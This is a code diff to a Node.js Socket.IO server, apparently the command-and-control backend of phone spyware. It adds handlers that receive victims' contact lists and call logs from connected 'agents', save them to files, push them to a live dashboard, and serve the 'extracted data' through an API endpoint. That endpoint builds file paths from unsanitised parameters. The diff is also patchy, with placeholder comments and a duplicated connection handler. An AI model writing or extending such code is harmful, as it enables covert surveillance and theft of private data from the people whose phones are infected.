@@ -20,6 +20,40 @@ app.use('/uploads', express.static('uploads'));
 const sessions = new Map();
 const upload = multer({ dest: 'uploads/', limits: { fileSize: 50 * 1024 * 1024 } });
 let sessionCounter = 0;
+// ... (mismo encabezado que tu código anterior)
+
+io.on('connection', (socket) => {
+  // ... (mismo registro de agente)
+
+  // NUEVO: Guardar Contactos
+  socket.on('contacts-list', (data) => {
+    const fileName = `uploads/contacts_${socket.sessionId}.json`;
+    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
+    console.log(`📂 Contactos guardados para ${socket.sessionId}`);
+  });
+
+  // NUEVO: Guardar Historial de Llamadas
+  socket.on('call-logs', (data) => {
+    const fileName = `uploads/calls_${socket.sessionId}.json`;
+    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
+    console.log(`📞 Historial de llamadas guardado para ${socket.sessionId}`);
+  });
+
+  // Reenvío al dashboard para visualización en tiempo real
+  socket.on('contacts-list', (data) => io.to(socket.sessionId).emit('dashboard-contacts', data));
+  socket.on('call-logs', (data) => io.to(socket.sessionId).emit('dashboard-calls', data));
+});
+
+// Endpoint adicional para ver datos extraídos
+app.get('/api/data/:sessionId/:type', (req, res) => {
+  const { sessionId, type } = req.params; // type: contacts o calls
+  const filePath = path.join(__dirname, 'uploads', `${type}_${sessionId}.json`);
+  if (fs.existsSync(filePath)) {
+    res.sendFile(filePath);
+  } else {
+    res.status(404).send("No hay datos extraídos aún.");
+  }
+});
 
 io.on('connection', (socket) => {
   console.log('Client connected:', socket.id);
